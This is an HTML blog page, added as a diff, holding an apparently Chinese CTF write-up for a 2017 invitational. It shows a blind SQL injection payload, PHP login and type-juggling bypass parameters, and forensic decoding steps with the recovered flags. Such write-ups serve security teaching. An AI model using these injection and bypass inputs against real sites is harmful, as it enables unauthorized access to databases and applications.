@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="盲注点隐藏的挺好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届美亚柏科邀请赛">
+<meta property="og:url" content="https://findneo.github.io/171223MeiyaCTFWP/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="盲注点隐藏的挺好">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-01-25T23:21:36.919Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第二届美亚柏科邀请赛">
+<meta name="twitter:description" content="盲注点隐藏的挺好">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/171223MeiyaCTFWP/">
+
+
+
+
+
+  <title>第二届美亚柏科邀请赛 | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/171223MeiyaCTFWP/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">第二届美亚柏科邀请赛</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T20:36:25+08:00">
+                2017-12-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  盲注点隐藏的挺好
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h4><blockquote>
+<p>Flag在哪里?</p>
+<p>链    接 <a href="http://10sBB7f7sSo9.isec.anscen.cn" target="_blank" rel="noopener">http://10sBB7f7sSo9.isec.anscen.cn</a></p>
+</blockquote>
+<p>burp抓包后向login.php常规 post <code>user[]=admin&amp;pass[]=a&amp;submit=submit</code>  。 得到<code>flag{7538a033d41f442cbae9578d4c189615}</code>  。</p>
+<h4 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h4><blockquote>
+<p>你找得到Flag吗？</p>
+<p>链    接<a href="http://3jhg9aks3.isec.anscen.cn" target="_blank" rel="noopener">http://3jhg9aks3.isec.anscen.cn</a></p>
+</blockquote>
+<ul>
+<li>fuzz发现某些响应包头部会多出<code>Set-Cookie: remind=U1FMSQ%3D%3D;</code> 字样，依此进行布尔型盲注。</li>
+<li>使用intruder的<code>Cluster Bomb</code> 模式自动化，攻击向量为<code>content=b&#39;||substr((select/**/hex(database())),$1$,1)=&#39;$6$&#39;#</code> </li>
+<li>处理得到flag</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">r=<span class="string">'p'</span>+<span class="string">'x'</span>*<span class="number">100</span></span><br><span class="line">r=[i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line"></span><br><span class="line">c0=[<span class="number">32</span>,<span class="number">42</span>]<span class="comment"># 表示数据的第32，42位是'0'</span></span><br><span class="line">c1=[<span class="number">6</span>,<span class="number">18</span>,<span class="number">30</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">76</span>]</span><br><span class="line">c2=[<span class="number">40</span>,<span class="number">60</span>]</span><br><span class="line">c3=[<span class="number">11</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">33</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">57</span>,<span class="number">61</span>,<span class="number">65</span>,<span class="number">67</span>,<span class="number">73</span>,<span class="number">74</span>,<span class="number">75</span>]</span><br><span class="line">c4=[<span class="number">14</span>,<span class="number">20</span>,<span class="number">56</span>]</span><br><span class="line">c5=[<span class="number">16</span>,<span class="number">28</span>,<span class="number">36</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">68</span>]</span><br><span class="line">c6=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">27</span>,<span class="number">29</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">69</span>,<span class="number">71</span>]</span><br><span class="line">c7=[<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">62</span>,<span class="number">77</span>]</span><br><span class="line">c8=[<span class="number">26</span>,<span class="number">50</span>,<span class="number">58</span>]</span><br><span class="line">c9=[<span class="number">34</span>,<span class="number">66</span>]</span><br><span class="line">ca=[]</span><br><span class="line">cb=[<span class="number">10</span>]<span class="comment"># 表示数据的第10位是'b'</span></span><br><span class="line">cc=[<span class="number">4</span>]</span><br><span class="line">cd=[<span class="number">78</span>]</span><br><span class="line">ce=[]</span><br><span class="line">cf=[]</span><br><span class="line"></span><br><span class="line">call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(call)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> call[i]:</span><br><span class="line">		r[j]=hex(i)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(r)</span><br><span class="line"><span class="comment">#666c61677b3764356164363738656130393533623036356538376364386237663935616133317d</span></span><br><span class="line"><span class="comment">#flag&#123;7d5ad678ea0953b065e87cd8b7f95aa31&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>题外话：使用hex()编码待查询数据再进行注入会把数据长度增长一倍，但待选字符集大小将减少到十六个，对于像本题这样没法二分的情况很高效。对于可以二分查找的情况复杂度和直接注入是一样的，还可以避开不可见字符的干扰。</li>
+</ul>
+<h4 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h4><blockquote>
+<p>还没找到flag么</p>
+<p>链    接<a href="http://8ah3ka0akj.isec.anscen.cn" target="_blank" rel="noopener">http://8ah3ka0akj.isec.anscen.cn</a></p>
+</blockquote>
+<p>查看源码，循序渐进。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">view-source:<span class="comment">//http://8ah3ka0akj.isec.anscen.cn/?key1=php://input&amp;key2=skwerl11&amp;key3=665.99999999999999&amp;key4=99999999999999999999999999999999999999</span></span><br><span class="line">post Hello hacker!</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">Hello hacker! <span class="keyword">Do</span> you want the flag?&lt;br&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">	$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">	$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line">	<span class="keyword">if</span>(file_get_contents($k1)===<span class="string">"Hello hacker!"</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'welcome! Hacker!&lt;br&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">--&gt;sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj</span><br><span class="line">welcome! Hacker!&lt;br&gt;&lt;!--</span><br><span class="line">		<span class="keyword">if</span>(md5($k2)&gt;<span class="number">666666</span>*<span class="number">666666</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">include</span>(<span class="string">'ctf.php'</span>); </span><br><span class="line">		&#125;</span><br><span class="line">--&gt;</span><br><span class="line">Come on, flag is coming&lt;br&gt;flag&#123;<span class="number">0</span>fd14555a5d275b253aff1bae158ca7c&#125;&lt;!--</span><br><span class="line">		$k3=$_GET[<span class="string">'key3'</span>];</span><br><span class="line">		$k4=$_GET[<span class="string">'key4'</span>];</span><br><span class="line">		<span class="keyword">if</span>(intval($k3)&lt;<span class="number">666</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>($k3==<span class="number">666</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Come on, flag is coming&lt;br&gt;'</span>;</span><br><span class="line">				<span class="keyword">if</span>($k4&gt;<span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(intval($k3+$k4)&lt;<span class="number">666</span>)</span><br><span class="line">						<span class="keyword">echo</span> $flag;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC4"><a href="#MISC4" class="headerlink" title="MISC4"></a>MISC4</h4><blockquote>
+<p>到底什么才是打开flag的正确姿势？</p>
+<p>链    接<a href="http://1e3g6S39v5M9.isec.anscen.cn" target="_blank" rel="noopener">http://1e3g6S39v5M9.isec.anscen.cn</a></p>
+</blockquote>
+<p>解压<code>Misc_Flow.rar</code> 得到<code>flag.rar</code> 和<code>Hints.txt</code> 两个文件，其中<code>hint.txt</code> 提示<code>Blasting code???No No No!There is another txt file.</code> ，尝试用<code>alternatestreamview.exe</code> 扫描文件夹，得到隐藏的流文件<code>:password.txt:$DATA</code> ，提取出内容是<code>c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad</code> 。</p>
+<p>发现<code>flag.rar</code> 无法作为压缩包打开，修复文件头为正确的<code>52617221</code> 后将上面字符串作为密码即可打开，得到包含flag的图片。<code>flag{43cca4b3de2097b9558efefb0ecc3588}</code> </p>
+<h4 id="MISC5"><a href="#MISC5" class="headerlink" title="MISC5"></a>MISC5</h4><blockquote>
+<p>截获了一份敌军的流量包，据悉暗号就在里面</p>
+<p>链    接<a href="http://2S8h7F84v4M0.isec.anscen.cn" target="_blank" rel="noopener">http://2S8h7F84v4M0.isec.anscen.cn</a></p>
+</blockquote>
+<p>过滤出ICMP包，按顺序排列，发现数据包长度可疑。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">144</span>,<span class="number">150</span>,<span class="number">139</span>,<span class="number">145</span>,<span class="number">165</span>,<span class="number">91</span>,<span class="number">109</span>,<span class="number">151</span>,<span class="number">122</span>,<span class="number">113</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">93</span>,<span class="number">167</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(i<span class="number">-42</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a])</span><br><span class="line"><span class="comment"># flag&#123;1CmPG@M3&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC?"></a>MISC?</h4><blockquote>
+<p>can’t see anything</p>
+<p>什么也看不见</p>
+</blockquote>
+<p>感谢川大师傅提供思路。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">题图末尾有base32字符串</span><br><span class="line">KA2DAMBQGAYDATRVGAYDCMBQGAYTAMBQGAYDAMBQGA3DANJQJ42DANJRGAZVCUZSHA4DSNKPGAYTCU2SGEYDGUKTGI4DQOJVJ4YDCMKTKIYTAM2RKMZDQOBRHEZTAOBUKAZTAMBYGEYDAMJQGAYDAMBQGAYDAMBQGAZDAMCOGA2DOOBXGQ3VEMRXGYYTMUBWGY3DAMBQGAYDAMBQGAYDAMBQGAYDEMBQGAYDAMBQGAYDAMBQGAYDIMRQGA4DAMBQGAYDAMBWGIYDAMBQGAYDMMSPGJHE6OCRHA2E6NBRGNITOOJVGAYDQMBQGA4TAMBQGQYTAMCTGEZDAMJQJ42DANJRGBHDMUJQKE4FCMBTHEZDSMRVGM2VAMBSGVIFAM2RGM4VANCQHAZE6MZQGUZVENCRGRHDINJTG4ZTIM2SGQ3DGMJTGQZVCNCQGQ3U6NRTKNHFANBZGRHVATZUGQ3TQNZUG5JDENZWGE3FANRWGYYDAMBQGAYDQMBQGAYDAMBQGYZDAMBQGAYDANRSJ4ZE4TZYKE4DITZUGEZVCNZZGUYDAOBQGAYDAMBQGA2DCNBQGMYE6NBQGU======</span><br><span class="line">解码后得到</span><br><span class="line">P4000000N500100010000000006050O405103QS28895O011SR103QS28895O011SR103QS288193084P30081001000000000000200N0478747R27616P6660000000000000002000000000000004200800000006200000062O2NO8Q84O413Q79500800090004100S12010O40510N6Q0Q8Q039292535P025PP3Q39P4P82O3053R4Q4N4537343R4631343Q4P47O63SNP494OPO4478747R27616P666000000800000006200000062O2NO8Q84O413Q7950080000000414030O405</span><br><span class="line">将NOPQRS依次替换为ABCDEF得到十六进制串</span><br><span class="line">C4000000A500100010000000006050B405103DF28895B011FE103DF28895B011FE103DF288193084C30081001000000000000200A0478747E27616C6660000000000000002000000000000004200800000006200000062B2AB8D84B413D79500800090004100F12010B40510A6D0D8D039292535C025CC3D39C4C82B3053E4D4A4537343E4631343D4C47B63FAC494BCB4478747E27616C666000000800000006200000062B2AB8D84B413D7950080000000414030B405</span><br><span class="line">将字符串反序，得到<span class="number">504</span>B开头的字符串</span><br><span class="line"><span class="number">504</span>B0304140000000800597D314B48D8BA2B260000002600000008000000666C61672E7478744BCB494CAF36B74C4D3431364E3437354A4D4E3503B28C4C93D3CC520C535292930D8D0D6A01504B01021F00140009000800597D314B48D8BA2B2600000026000000080024000000000000002000000000000000666C61672E7478740A00200000000000010018003C480391882FD301EF110B59882FD301EF110B59882FD301504B050600000000010001005A0000004C</span><br><span class="line">使用十六进制编辑器保存为rar文件</span><br><span class="line">打开可见flag.txt文件</span><br><span class="line">flag&#123;<span class="number">79</span>ea433a752ece633a25cf6d1ddcc130&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/171125TextualRepresentationOfIPAddress/" rel="next" title="IP地址混淆">
+                <i class="fa fa-chevron-left"></i> IP地址混淆
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/180107XmanCampOnlineWP/" rel="prev" title="“华为杯”极客出发XMan冬令营线上CTF解题赛">
+                “华为杯”极客出发XMan冬令营线上CTF解题赛 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB2"><span class="nav-number">1.1.</span> <span class="nav-text">WEB2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB4"><span class="nav-number">1.2.</span> <span class="nav-text">WEB4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB5"><span class="nav-number">1.3.</span> <span class="nav-text">WEB5</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MISC4"><span class="nav-number">2.1.</span> <span class="nav-text">MISC4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MISC5"><span class="nav-number">2.2.</span> <span class="nav-text">MISC5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MISC-1"><span class="nav-number">2.3.</span> <span class="nav-text">MISC?</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/171223MeiyaCTFWP/';
+          this.page.identifier = '171223MeiyaCTFWP/';
+          this.page.title = '第二届美亚柏科邀请赛';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
